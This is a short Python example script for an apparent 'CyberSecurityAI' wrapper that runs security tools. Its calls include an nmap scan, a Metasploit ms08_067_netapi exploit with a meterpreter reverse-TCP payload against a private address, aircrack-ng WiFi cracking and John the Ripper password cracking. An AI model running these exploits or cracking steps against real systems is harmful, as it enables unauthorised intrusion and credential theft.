from cyber_security_ai import CyberSecurityAI

# Initialize the AI
ai = CyberSecurityAI()

# Example of running an Nmap scan
print(ai.run_tool('nmap', '192.168.1.1'))

# Example of running a Metasploit exploit
print(ai.run_tool('metasploit', 'exploit/windows/smb/ms08_067_netapi', 'payload/windows/meterpreter/reverse_tcp', '192.168.1.1'))

# Example of cracking WiFi with Aircrack-ng
print(ai.run_tool('aircrack-ng', 'capture.cap', 'wordlist.txt'))

# Example of analyzing a PCAP file with Wireshark
print(ai.run_tool('wireshark', 'network_traffic.pcap'))

# Example of cracking a password hash with John the Ripper
print(ai.run_tool('john', 'passwords.txt', 'wordlist.txt'))

# Example of transferring data with cURL
print(ai.run_tool('curl', 'https://example.com'))
